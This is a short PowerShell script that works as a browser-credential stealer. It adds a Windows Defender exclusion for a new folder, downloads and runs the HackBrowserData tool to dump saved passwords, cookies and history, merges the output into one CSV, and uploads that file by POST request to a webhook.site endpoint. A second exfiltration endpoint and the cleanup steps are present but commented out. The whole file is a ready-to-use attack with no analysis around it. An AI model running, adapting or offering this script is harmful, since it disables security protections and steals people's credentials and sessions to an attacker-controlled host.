cd \ 
mkdir a
cd a
Add-MpPreference -ExclusionPath "C:\a\"
Start-Sleep -Seconds 5
curl https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.4/hack-browser-data-windows-32bit.zip -OutFile C:\a\hack-browser-data-windows-32bit.zip
Start-Sleep -Seconds 5
Expand-Archive -LiteralPath C:\a\hack-browser-data-windows-32bit.zip -DestinationPath C:\a\
Start-Sleep -Seconds 5
C:\a\hack-browser-data-windows-32bit.exe
Start-Sleep -Seconds 10
Get-ChildItem -Path .\Results -Filter "*.csv" | ForEach-Object {
    Get-Content $_.FullName | Select-Object -Skip 1 | Add-Content -Path final.csv
}
Start-Sleep -Seconds 5
#Invoke-WebRequest -Uri https://eom42ixwtnc2bh1.m.pipedream.net -Method Post -Infile .\final.csv  -UseBasicParsing
Invoke-WebRequest -Uri https://webhook.site/961aad4b-5215-4f52-b6a5-e8755e68f401 -Method Post -Infile .\final.csv  -UseBasicParsing
cd ..
#Remove-Item -Path "C:\a" -Recurse
#Remove-MpPreference -ExclusionPath "C:\a\"